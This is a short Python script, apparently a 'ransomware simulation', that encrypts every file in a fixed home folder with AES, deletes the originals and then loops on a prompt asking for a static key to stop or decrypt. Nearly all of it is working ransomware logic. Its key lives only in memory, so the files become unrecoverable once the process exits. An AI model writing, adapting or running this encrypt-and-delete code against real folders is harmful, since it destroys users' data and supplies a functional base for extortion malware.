import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import random
import string

# Configuration
TARGET_FOLDER = "/home/r1ley/ransom"  # Folder containing the files to be encrypted
STATIC_KEY = "ransomware_test_key"  # Static key to control script (disable/decrypt functionality)

# AES Key and Initialization Vector (IV) for encryption
KEY = os.urandom(32)  # 256-bit AES key
IV = os.urandom(16)   # 128-bit Initialization Vector (IV)

# Helper function to generate a filename with the .enc extension
def generate_encrypted_filename(file_path):
    return file_path + ".enc"

# Function to encrypt data using AES encryption
def encrypt_data(data):
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    encryptor = cipher.encryptor()

    # Pad data to ensure it's a multiple of AES block size (16 bytes)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Encrypt the padded data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    return encrypted_data

# Function to encrypt an existing file
def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        file_data = f.read()  # Read the file's data

    # Encrypt the data
    encrypted_data = encrypt_data(file_data)

    # Write the encrypted data to a new file
    encrypted_file_path = generate_encrypted_filename(file_path)
    with open(encrypted_file_path, "wb") as f:
        f.write(encrypted_data)

    # Optionally, remove the original file after encryption
    os.remove(file_path)
    print(f"Encrypted and removed: {file_path}")

# Function to decrypt data using AES encryption
def decrypt_data(data):
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_data = decryptor.update(data) + decryptor.finalize()

    # Unpad the decrypted data
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

    return unpadded_data

# Function to decrypt an encrypted file
def decrypt_file(file_path):
    with open(file_path, "rb") as f:
        encrypted_data = f.read()

    # Decrypt the data
    decrypted_data = decrypt_data(encrypted_data)

    # Write the decrypted data back to the file
    decrypted_file_path = file_path.replace(".enc", "")
    with open(decrypted_file_path, "wb") as f:
        f.write(decrypted_data)

    # Optionally, remove the encrypted file after decryption
    os.remove(file_path)
    print(f"Decrypted and removed: {file_path}")

# Function to check for the static key to disable the script or decrypt files
def check_for_static_key():
    user_input = input("Enter the static key to disable the script or decrypt files (or press Enter to continue running): ")
    if user_input == STATIC_KEY:
        print("Static key accepted. What would you like to do?")
        action = input("Enter 'disable' to stop the encryption process or 'decrypt' to decrypt files: ").strip().lower()

        if action == "disable":
            print("Disabling the ransomware simulation...")
            os._exit(0)  # Stops the script

        elif action == "decrypt":
            print("Decrypting all encrypted files in the target folder...")
            for file_name in os.listdir(TARGET_FOLDER):
                file_path = os.path.join(TARGET_FOLDER, file_name)
                if os.path.isfile(file_path) and file_path.endswith(".enc"):
                    decrypt_file(file_path)
                    print(f"Decrypted: {file_name}")
        else:
            print("Invalid action. Continuing with the encryption process.")

# Function to encrypt all files in the target directory
def encrypt_all_files():
    for file_name in os.listdir(TARGET_FOLDER):
        file_path = os.path.join(TARGET_FOLDER, file_name)
        if os.path.isfile(file_path):
            encrypt_file(file_path)

# Main function
if __name__ == "__main__":
    print("Starting ransomware simulation with AES encryption...")

    # Start the encryption process
    encrypt_all_files()

    # Allow for checking the static key to disable or decrypt files
    while True:
        check_for_static_key()
